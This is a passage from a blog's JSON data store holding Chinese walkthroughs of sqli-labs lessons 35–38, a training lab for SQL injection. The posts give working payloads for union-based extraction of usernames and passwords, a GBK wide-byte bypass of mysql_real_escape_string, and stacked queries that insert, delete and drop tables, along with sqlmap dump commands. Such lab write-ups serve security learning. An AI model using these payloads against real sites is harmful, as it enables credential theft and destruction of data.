alt=\"014\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-35/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-35/002.png\" alt=\"002\"></p>\n<p>数字型的注入是不需要用到双引号的,当遇到表名用双引号包起来的时候转成16进制编码的即可。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><p>输入单引号报错</p>\n<p><img src=\"/img/sql/Lesson-35/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-35/004.png\" alt=\"004\"></p>\n<p>通过<code>http://192.168.75.132/sql/Less-35/?id=1 and 1=2</code>确定是数字型,如果是字符型应该像第一课一样显示出id=1的内容。</p>\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.132/sql/Less-35/?id=1 order by 3%23</code></p>\n<p><img src=\"/img/sql/Lesson-35/005.png\" alt=\"005\"></p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://192.168.75.132/sql/Less-35/?id=-1 union select 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-35/006.png\" alt=\"006\"></p>\n<p><code>http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(database()),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-35/007.png\" alt=\"007\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=0x7365637572697479),3%23</code></p>\n<p>其中原来的<code>&#39;security&#39;</code>用<code>0x7365637572697479</code>替代,绕过了使用单引号。</p>\n<p><img src=\"/img/sql/Lesson-35/008.png\" alt=\"008\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>users</code>用<code>0x7573657273</code>替代。</p>\n<p><code>http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-35/009.png\" alt=\"009\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(username,0x7e,password) from users),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-35/010.png\" alt=\"010\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-35/?id=1&quot; --dbms mysql -v 3 --technique E --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-35/011.png\" alt=\"011\"></p>\n<p><img src=\"/img/sql/Lesson-35/012.png\" alt=\"012\"></p>\n<p>没什么好说的，直接上结果。</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-35/?id=1&quot; --dbms mysql -v 3 --technique E -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-35/013.png\" alt=\"013\"></p>\n<p><img src=\"/img/sql/Lesson-35/014.png\" alt=\"014\"></p>\n"},{"title":"sqli-labs lession-36 GET-绕过Mysql_real_escape_string","date":"2018-10-15T12:50:48.000Z","_content":"\n# sqli-labs lession-36 GET-绕过Mysql_real_escape_string\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-36/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-36/002.png)\n\n![003](/img/sql/Lesson-36/003.png)\n\nmysql_query( \"SET NAMES gbk\");这一句的作用能使三个字符集（客户端、连接层、结果集）都是GBK编码,分别对应`SET character_set_client = utf8;`，`SET character_set_results = utf8;`，`SET character_set_connection = utf8;`与AddSlashes不同的是mysql_query会考虑到连接的字符集。按理来说应该避免了宽字节绕过,下面查找下原因。\n\n使用 `Show variables like \"cha_%\";`查看当前字符集。\n\n![004](/img/sql/Lesson-36/004.png)\n\n修改源代码临时使`security`字符集为gbk。\n\n`mysql_query(\"SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary;\");`\n\n![005](/img/sql/Lesson-36/005.png)\n\n修改后使用宽字节注入,发现执行失败。\n\n![006](/img/sql/Lesson-36/006.png)\n\n宽字节注入发生的位置就是`PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码`，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码。\n\n```\naddSlashes函数:\n%df%27===>(addslashes)====>%df%5c%27====>(GBK)====>運’\n用户输入==>过滤函数==>代码层的$sql==>mysql处理请求==>mysql中的sql\n\nmysql_real_escape_string函数：\n如果mysql数据库中字符集也为gbk,与mysql_query(\"SET NAMES gbk\");的编码相同就不会把%df和%5c拼接为一个宽字节的问题\n\n```\n\n而原来这里发生宽字节注入的原因是\n`mysql_query( \"SET NAMES gbk\");`设置字符集后,`mysql_real_escape_string` 函数没有立即调用更新的字符集，而把原来的编码拿来用了。\n\n## 注入\n\n对于使用`mysql_query( \"SET NAMES gbk\");`的情况，如果mysql中编码不是gbk,依旧可以使用宽字节绕过。\n\n其他的和前几课一样,这里直接拿上几课的payload来用。具体过程请看Lesson-32。\n\n{% post_link sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠 点击查看Lesson-32%}\n\n`http://192.168.75.132/sql/Less-36/?id=2%df' and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23`\n\n![007](/img/sql/Lesson-36/007.png)\n\n## SQLMAP\n\n一模一样直接上结果。\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-36/?id=2'\" --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -D security -T users --columns --dump`\n\n![008](/img/sql/Lesson-36/008.png)\n\n![009](/img/sql/Lesson-36/009.png)\n\n![010](/img/sql/Lesson-36/010.png)","source":"_posts/sqli-labs-lession-36-GET-绕过Mysql-real-escape-string.md","raw":"---\ntitle: sqli-labs lession-36 GET-绕过Mysql_real_escape_string\ndate: 2018-10-15 20:50:48\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-36 GET-绕过Mysql_real_escape_string\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-36/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-36/002.png)\n\n![003](/img/sql/Lesson-36/003.png)\n\nmysql_query( \"SET NAMES gbk\");这一句的作用能使三个字符集（客户端、连接层、结果集）都是GBK编码,分别对应`SET character_set_client = utf8;`，`SET character_set_results = utf8;`，`SET character_set_connection = utf8;`与AddSlashes不同的是mysql_query会考虑到连接的字符集。按理来说应该避免了宽字节绕过,下面查找下原因。\n\n使用 `Show variables like \"cha_%\";`查看当前字符集。\n\n![004](/img/sql/Lesson-36/004.png)\n\n修改源代码临时使`security`字符集为gbk。\n\n`mysql_query(\"SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary;\");`\n\n![005](/img/sql/Lesson-36/005.png)\n\n修改后使用宽字节注入,发现执行失败。\n\n![006](/img/sql/Lesson-36/006.png)\n\n宽字节注入发生的位置就是`PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码`，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码。\n\n```\naddSlashes函数:\n%df%27===>(addslashes)====>%df%5c%27====>(GBK)====>運’\n用户输入==>过滤函数==>代码层的$sql==>mysql处理请求==>mysql中的sql\n\nmysql_real_escape_string函数：\n如果mysql数据库中字符集也为gbk,与mysql_query(\"SET NAMES gbk\");的编码相同就不会把%df和%5c拼接为一个宽字节的问题\n\n```\n\n而原来这里发生宽字节注入的原因是\n`mysql_query( \"SET NAMES gbk\");`设置字符集后,`mysql_real_escape_string` 函数没有立即调用更新的字符集，而把原来的编码拿来用了。\n\n## 注入\n\n对于使用`mysql_query( \"SET NAMES gbk\");`的情况，如果mysql中编码不是gbk,依旧可以使用宽字节绕过。\n\n其他的和前几课一样,这里直接拿上几课的payload来用。具体过程请看Lesson-32。\n\n{% post_link sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠 点击查看Lesson-32%}\n\n`http://192.168.75.132/sql/Less-36/?id=2%df' and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23`\n\n![007](/img/sql/Lesson-36/007.png)\n\n## SQLMAP\n\n一模一样直接上结果。\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-36/?id=2'\" --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -D security -T users --columns --dump`\n\n![008](/img/sql/Lesson-36/008.png)\n\n![009](/img/sql/Lesson-36/009.png)\n\n![010](/img/sql/Lesson-36/010.png)","slug":"sqli-labs-lession-36-GET-绕过Mysql-real-escape-string","published":1,"updated":"2019-06-19T17:23:13.392Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istee004l4dsblmy54z9y","content":"<h1 id=\"sqli-labs-lession-36-GET-绕过Mysql-real-escape-string\"><a href=\"#sqli-labs-lession-36-GET-绕过Mysql-real-escape-string\" class=\"headerlink\" title=\"sqli-labs lession-36 GET-绕过Mysql_real_escape_string\"></a>sqli-labs lession-36 GET-绕过Mysql_real_escape_string</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-36/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-36/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-36/003.png\" alt=\"003\"></p>\n<p>mysql_query( “SET NAMES gbk”);这一句的作用能使三个字符集（客户端、连接层、结果集）都是GBK编码,分别对应<code>SET character_set_client = utf8;</code>，<code>SET character_set_results = utf8;</code>，<code>SET character_set_connection = utf8;</code>与AddSlashes不同的是mysql_query会考虑到连接的字符集。按理来说应该避免了宽字节绕过,下面查找下原因。</p>\n<p>使用 <code>Show variables like &quot;cha_%&quot;;</code>查看当前字符集。</p>\n<p><img src=\"/img/sql/Lesson-36/004.png\" alt=\"004\"></p>\n<p>修改源代码临时使<code>security</code>字符集为gbk。</p>\n<p><code>mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary;&quot;);</code></p>\n<p><img src=\"/img/sql/Lesson-36/005.png\" alt=\"005\"></p>\n<p>修改后使用宽字节注入,发现执行失败。</p>\n<p><img src=\"/img/sql/Lesson-36/006.png\" alt=\"006\"></p>\n<p>宽字节注入发生的位置就是<code>PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码</code>，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">addSlashes函数:</span><br><span class=\"line\">%df%<span class=\"number\">27</span>===&gt;(addslashes)====&gt;%df%<span class=\"number\">5</span>c%<span class=\"number\">27</span>====&gt;(GBK)====&gt;運’</span><br><span class=\"line\">用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql</span><br><span class=\"line\"></span><br><span class=\"line\">mysql_real_escape_string函数：</span><br><span class=\"line\">如果mysql数据库中字符集也为gbk,与mysql_query(<span class=\"string\">\"SET NAMES gbk\"</span>);的编码相同就不会把%df和%<span class=\"number\">5</span>c拼接为一个宽字节的问题</span><br></pre></td></tr></table></figure>\n\n<p>而原来这里发生宽字节注入的原因是<br><code>mysql_query( &quot;SET NAMES gbk&quot;);</code>设置字符集后,<code>mysql_real_escape_string</code> 函数没有立即调用更新的字符集，而把原来的编码拿来用了。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>对于使用<code>mysql_query( &quot;SET NAMES gbk&quot;);</code>的情况，如果mysql中编码不是gbk,依旧可以使用宽字节绕过。</p>\n<p>其他的和前几课一样,这里直接拿上几课的payload来用。具体过程请看Lesson-32。</p>\n<a href=\"/2018/10/14/sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠/\" title=\"点击查看Lesson-32\">点击查看Lesson-32</a>\n\n<p><code>http://192.168.75.132/sql/Less-36/?id=2%df&#39; and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-36/007.png\" alt=\"007\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>一模一样直接上结果。</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-36/?id=2&#39;&quot; --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-36/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-36/009.png\" alt=\"009\"></p>\n<p><img src=\"/img/sql/Lesson-36/010.png\" alt=\"010\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-36-GET-绕过Mysql-real-escape-string\"><a href=\"#sqli-labs-lession-36-GET-绕过Mysql-real-escape-string\" class=\"headerlink\" title=\"sqli-labs lession-36 GET-绕过Mysql_real_escape_string\"></a>sqli-labs lession-36 GET-绕过Mysql_real_escape_string</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-36/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-36/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-36/003.png\" alt=\"003\"></p>\n<p>mysql_query( “SET NAMES gbk”);这一句的作用能使三个字符集（客户端、连接层、结果集）都是GBK编码,分别对应<code>SET character_set_client = utf8;</code>，<code>SET character_set_results = utf8;</code>，<code>SET character_set_connection = utf8;</code>与AddSlashes不同的是mysql_query会考虑到连接的字符集。按理来说应该避免了宽字节绕过,下面查找下原因。</p>\n<p>使用 <code>Show variables like &quot;cha_%&quot;;</code>查看当前字符集。</p>\n<p><img src=\"/img/sql/Lesson-36/004.png\" alt=\"004\"></p>\n<p>修改源代码临时使<code>security</code>字符集为gbk。</p>\n<p><code>mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary;&quot;);</code></p>\n<p><img src=\"/img/sql/Lesson-36/005.png\" alt=\"005\"></p>\n<p>修改后使用宽字节注入,发现执行失败。</p>\n<p><img src=\"/img/sql/Lesson-36/006.png\" alt=\"006\"></p>\n<p>宽字节注入发生的位置就是<code>PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码</code>，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">addSlashes函数:</span><br><span class=\"line\">%df%<span class=\"number\">27</span>===&gt;(addslashes)====&gt;%df%<span class=\"number\">5</span>c%<span class=\"number\">27</span>====&gt;(GBK)====&gt;運’</span><br><span class=\"line\">用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql</span><br><span class=\"line\"></span><br><span class=\"line\">mysql_real_escape_string函数：</span><br><span class=\"line\">如果mysql数据库中字符集也为gbk,与mysql_query(<span class=\"string\">\"SET NAMES gbk\"</span>);的编码相同就不会把%df和%<span class=\"number\">5</span>c拼接为一个宽字节的问题</span><br></pre></td></tr></table></figure>\n\n<p>而原来这里发生宽字节注入的原因是<br><code>mysql_query( &quot;SET NAMES gbk&quot;);</code>设置字符集后,<code>mysql_real_escape_string</code> 函数没有立即调用更新的字符集，而把原来的编码拿来用了。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>对于使用<code>mysql_query( &quot;SET NAMES gbk&quot;);</code>的情况，如果mysql中编码不是gbk,依旧可以使用宽字节绕过。</p>\n<p>其他的和前几课一样,这里直接拿上几课的payload来用。具体过程请看Lesson-32。</p>\n<a href=\"/2018/10/14/sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠/\" title=\"点击查看Lesson-32\">点击查看Lesson-32</a>\n\n<p><code>http://192.168.75.132/sql/Less-36/?id=2%df&#39; and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-36/007.png\" alt=\"007\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>一模一样直接上结果。</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-36/?id=2&#39;&quot; --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-36/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-36/009.png\" alt=\"009\"></p>\n<p><img src=\"/img/sql/Lesson-36/010.png\" alt=\"010\"></p>\n"},{"title":"sqli-labs lession-37 POST-绕过Mysql-real-escape-string","date":"2018-10-15T16:28:50.000Z","_content":"\n# sqli-labs lession-37 POST-绕过Mysql-real-escape-string\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-37/001.png)\n\n## 分析\n\n{% post_link sqli-labs-lession-36-GET-绕过Mysql-real-escape-string 点击查看Lesson-36%}\n\n## 过程\n\n这一课的payload和Lesson-34一模一样,就不贴过程了\n\n`uname=admin1%df'and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23&passwd=123&submit=Submit`\n\n![001](/img/sql/Lesson-38/001.png)\n\n\n\n## SQLMAP\n\n和Lesson-34一模一样。\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-37/\" --data \"uname=admin'&passwd=123&submit=Submit\" -p uname --method POST --dbms mysql --threads 32 --technique E --tamper unmagicquotes.py -D security -T users --columns --dump`\n\n![002](/img/sql/Lesson-38/002.png)\n\n![003](/img/sql/Lesson-38/003.png)\n\n![004](/img/sql/Lesson-38/004.png)","source":"_posts/sqli-labs-lession-37-POST-绕过Mysql-real-escape-string.md","raw":"---\ntitle: sqli-labs lession-37 POST-绕过Mysql-real-escape-string\ndate: 2018-10-16 00:28:50\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-37 POST-绕过Mysql-real-escape-string\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-37/001.png)\n\n## 分析\n\n{% post_link sqli-labs-lession-36-GET-绕过Mysql-real-escape-string 点击查看Lesson-36%}\n\n## 过程\n\n这一课的payload和Lesson-34一模一样,就不贴过程了\n\n`uname=admin1%df'and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23&passwd=123&submit=Submit`\n\n![001](/img/sql/Lesson-38/001.png)\n\n\n\n## SQLMAP\n\n和Lesson-34一模一样。\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-37/\" --data \"uname=admin'&passwd=123&submit=Submit\" -p uname --method POST --dbms mysql --threads 32 --technique E --tamper unmagicquotes.py -D security -T users --columns --dump`\n\n![002](/img/sql/Lesson-38/002.png)\n\n![003](/img/sql/Lesson-38/003.png)\n\n![004](/img/sql/Lesson-38/004.png)","slug":"sqli-labs-lession-37-POST-绕过Mysql-real-escape-string","published":1,"updated":"2019-06-19T17:23:13.392Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3isteg004q4dsb27idalfn","content":"<h1 id=\"sqli-labs-lession-37-POST-绕过Mysql-real-escape-string\"><a href=\"#sqli-labs-lession-37-POST-绕过Mysql-real-escape-string\" class=\"headerlink\" title=\"sqli-labs lession-37 POST-绕过Mysql-real-escape-string\"></a>sqli-labs lession-37 POST-绕过Mysql-real-escape-string</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-37/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><a href=\"/2018/10/15/sqli-labs-lession-36-GET-绕过Mysql-real-escape-string/\" title=\"点击查看Lesson-36\">点击查看Lesson-36</a>\n\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><p>这一课的payload和Lesson-34一模一样,就不贴过程了</p>\n<p><code>uname=admin1%df&#39;and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23&amp;passwd=123&amp;submit=Submit</code></p>\n<p><img src=\"/img/sql/Lesson-38/001.png\" alt=\"001\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>和Lesson-34一模一样。</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-37/&quot; --data &quot;uname=admin&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname --method POST --dbms mysql --threads 32 --technique E --tamper unmagicquotes.py -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-38/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-38/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-38/004.png\" alt=\"004\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-37-POST-绕过Mysql-real-escape-string\"><a href=\"#sqli-labs-lession-37-POST-绕过Mysql-real-escape-string\" class=\"headerlink\" title=\"sqli-labs lession-37 POST-绕过Mysql-real-escape-string\"></a>sqli-labs lession-37 POST-绕过Mysql-real-escape-string</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-37/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><a href=\"/2018/10/15/sqli-labs-lession-36-GET-绕过Mysql-real-escape-string/\" title=\"点击查看Lesson-36\">点击查看Lesson-36</a>\n\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><p>这一课的payload和Lesson-34一模一样,就不贴过程了</p>\n<p><code>uname=admin1%df&#39;and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23&amp;passwd=123&amp;submit=Submit</code></p>\n<p><img src=\"/img/sql/Lesson-38/001.png\" alt=\"001\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>和Lesson-34一模一样。</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-37/&quot; --data &quot;uname=admin&#39;&amp;passwd=123&amp;submit=Submit&quot; -p uname --method POST --dbms mysql --threads 32 --technique E --tamper unmagicquotes.py -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-38/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-38/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-38/004.png\" alt=\"004\"></p>\n"},{"title":"sqli-labs lession-38 GET-堆叠注入","date":"2018-10-16T02:33:39.000Z","_content":"\n# sqli-labs lession-38 GET-堆叠注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-38/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-38/002.png)\n\n![003](/img/sql/Lesson-38/003.png)\n\n![004](/img/sql/Lesson-38/004.png)\n\n![005](/img/sql/Lesson-38/005.png)\n\n![006](/img/sql/Lesson-38/006.png)\n\n总的来说就是可以用;隔开多个sql语句来执行,但是这里有多个查询结果的话只能返回第一个查询的结果集。还可以建表添加用户的操作，但是没有回显就是了，这些操作是建立在了解注入的是数据库的数据结构的基础上的。\n\n## 过程\n\n跟Lesson-1唯一的不同就是可执行多条sql语句了。检验注入漏洞。一般用于增删改。\n\n`http://192.168.75.132/sql/Less-38/?id=2' and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23'`\n\n![007](/img/sql/Lesson-38/007.png)\n\n### 增\n\n#### 创建表\n\n`http://192.168.75.132/sql/Less-38/?id=2';create table test like users;%23`\n\n![008](/img/sql/Lesson-38/008.png)\n\n#### 插入数据\n\n`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;insert into test(id,username,password)values(100,'zhao','zhao');%23`\n\n![009](/img/sql/Lesson-38/009.png)\n\n![010](/img/sql/Lesson-38/010.png)\n\n还可以将结构相同的表数据插入。\n\n`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;insert into test select * from users%23`\n\n![011](/img/sql/Lesson-38/011.png)\n\n![012](/img/sql/Lesson-38/012.png)\n\n### 删\n\n#### 删除数据\n\n`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;delete from test where id = 100%23`\n\n![013](/img/sql/Lesson-38/013.png)\n\n![014](/img/sql/Lesson-38/014.png)\n\n#### 删除表\n\n`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;drop table user_test;%23`\n\n### 改\n\n#### 修改表名\n\n`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;alter table test rename to user_test;%23`\n\n![015](/img/sql/Lesson-38/015.png)\n\n![016](/img/sql/Lesson-38/016.png)\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/sqli-labs-lession-38-GET-堆叠注入.md","raw":"---\ntitle: sqli-labs lession-38 GET-堆叠注入\ndate: 2018-10-16 10:33:39\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-38 GET-堆叠注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-38/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-38/002.png)\n\n![003](/img/sql/Lesson-38/003.png)\n\n![004](/img/sql/Lesson-38/004.png)\n\n![005](/img/sql/Lesson-38/005.png)\n\n![006](/img/sql/Lesson-38/006.png)\n\n总的来说就是可以用;隔开多个sql语句来执行,但是这里有多个查询结果的话只能返回第一个查询的结果集。还可以建表添加用户的操作，但是没有回显就是了，这些操作是建立在了解注入的是数据库的数据结构的基础上的。\n\n## 过程\n\n跟Lesson-1唯一的不同就是可执行多条sql语句了。检验注入漏洞。一般用于增删改。\n\n`http://192.168.75.132/sql/Less-38/?id=2' and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23'`\n\n![007](/img/sql/Lesson-38/007.png)\n\n### 增\n\n#### 创建表\n\n`http://192.168.75.132/sql/Less-38/?id=2';create table test like users;%23`\n\n![008](/img/sql/Lesson-38/008.png)\n\n#### 插入数据\n\n`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;insert into test(id,username,password)values(100,'zhao','zhao');%23`\n\n![009](/img/sql/Lesson-38/009.png)\n\n![010](/img/sql/Lesson-38/010.png)\n\n还可以将结构相同的表数据插入。\n\n`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;insert into test select * from users%23`\n\n![011](/img/sql/Lesson-38/011.png)\n\n![012](/img/sql/Lesson-38/012.png)\n\n### 删\n\n#### 删除数据\n\n`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;delete from test where id = 100%23`\n\n![013](/img/sql/Lesson-38/013.png)\n\n![014](/img/sql/Lesson-38/014.png)\n\n#### 删除表\n\n`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;drop table user_test;%23`\n\n### 改\n\n#### 修改表名\n\n`http://192.168.75.133/sql/Less-38/?id=-1'union select 1,2,3;alter table test rename to user_test;%23`\n\n![015](/img/sql/Lesson-38/015.png)\n\n![016](/img/sql/Lesson-38/016.png)\n\n\n\n\n\n\n\n\n\n\n","slug":"sqli-labs-lession-38-GET-堆叠注入","published":1,"updated":"2019-06-19T17:23:13.392Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istei004t4dsb293vpnrd","content":"<h1 id=\"sqli-labs-lession-38-GET-堆叠注入\"><a href=\"#sqli-labs-lession-38-GET-堆叠注入\" class=\"headerlink\" title=\"sqli-labs lession-38 GET-堆叠注入\"></a>sqli-labs lession-38 GET-堆叠注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" 